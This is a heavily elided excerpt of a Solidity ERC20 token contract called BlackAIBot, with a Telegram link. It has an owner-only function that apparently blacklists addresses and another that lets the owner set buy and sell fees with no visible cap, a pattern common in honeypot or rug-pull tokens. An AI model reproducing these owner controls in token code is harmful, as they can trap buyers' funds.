...
/**
Telegram: https://t.me/BlackAIBot
*/
...
contract BlackAIBot is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "BlackAIBot";
    string constant _symbol = "BAIBOT";
   ...
   function BLBots(address[] memory bots_, bool status) public onlyOwner {
    ...
    function Manual(uint256 _Manual, uint256 _ManualSend) external onlyOwner {
         marketingFee = _Manual;
         sellMarketingFee = _ManualSend;
